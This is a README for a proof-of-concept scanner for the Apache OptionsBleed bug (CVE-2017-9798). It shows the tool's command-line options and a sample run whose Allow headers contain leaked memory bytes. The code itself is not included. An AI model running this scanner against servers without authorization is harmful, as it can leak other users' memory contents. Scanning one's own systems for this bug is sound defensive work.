# OptionsBleed-POC-Scanner
OptionsBleed (CVE-2017-9798) PoC / Scanner

More information coming soon...

## Disclaimer
This software has been created purely for the purposes of academic research and for the development of effective defensive techniques, and is not intended to be used to attack systems except where explicitly authorized. Project maintainers are not responsible or liable for misuse of the software. Use responsibly.

## Usage
```
usage: bleeder.py [-h] [-c COUNT] [-fc] [-tc THREAD_COUNT] [-nv] [-ni] [-v] [-e] url

positional arguments:
  url                   full URL (including http(s)) to be scanned

optional arguments:
  -h, --help            show this help message and exit
  -c COUNT, --count COUNT
                        number of times to scan (default: 1000)
  -fc, --force-custom   forces the scan to only attempt using custom verb
                        method (default: try OPTIONS then custom)
  -tc THREAD_COUNT, --thread-count THREAD_COUNT
                        max concurrent thread count (default: 500)
  -nv, --no-verify      does not verify ssl connection (may be necessary for
                        self-signed certs)
  -ni, --no-ignore      does NOT ignore ssl warnings (default: ignored)
  -v, --verbose         print all headers
  -e, --errors          prints all errors
```

## Simple Usage

```
python bleeder.py "http://10.1.2.3" -c 50

        ::OptionsBleed (CVE-2017-9798) Scanner::

[+] scanning http://10.1.2.3 to see if it bleeds!
[+] checking OPTION method
[+] allow headers detected in OPTION response
[+] checking CUSTOM method
[+] allow headers detected in CUSTOM response
[+] scanning with OPTIONS method...
[+] scanning with custom (PULL) method...
[+] 50 responses captured
[+] unique results:
GET,HEAD,allow,HEAD,allow,HEAD,,HEAD,OPTIONS,POST,all,HEAD,
GET,HEAD,allow,HEAD,,HEAD,OPTIONS,POST,all,HEAD,
GET,HEAD,╚jφHU,HEAD,,HEAD,,HEAD,,HEAD,,HEAD,,HEAD,OPTIONS,POST,all,HEAD,,HEAD,,,
GET,HEAD,allow,HEAD,allow,HEAD,,HEAD,OPTIONS,POST,all,HEAD,all,HEAD,
GET,HEAD,allow,HEAD,OPTIONS,POST,all,HEAD,all,HEAD
GET,HEAD,allow,HEAD,╚jφHU,HEAD,,HEAD,,HEAD,OPTIONS,POST,,HEAD,all,HEAD,,HEAD,
GET,HEAD,allow,HEAD,OPTIONS,POST,all,HEAD
GET,HEAD,allow,HEAD,,HEAD,OPTIONS,POST,all,HEAD,all,HEAD,
GET,HEAD,allow,HEAD,allow,HEAD,OPTIONS,POST,all,HEAD
GET,HEAD,allow,HEAD,╚jφHU,HEAD,,HEAD,,HEAD,,HEAD,,HEAD,,HEAD,OPTIONS,POST,all,HEAD,,HEAD,,,
GET,HEAD,╚jφHU,HEAD,,HEAD,,HEAD,,HEAD,,HEAD,,HEAD,,HEAD,OPTIONS,POST,all,HEAD,,HEAD,,,
GET,HEAD,allow,HEAD,allow,HEAD,╚jφHU,HEAD,,HEAD,,HEAD,OPTIONS,POST,,HEAD,all,HEAD,,HEAD,
[+] scan complete!
```
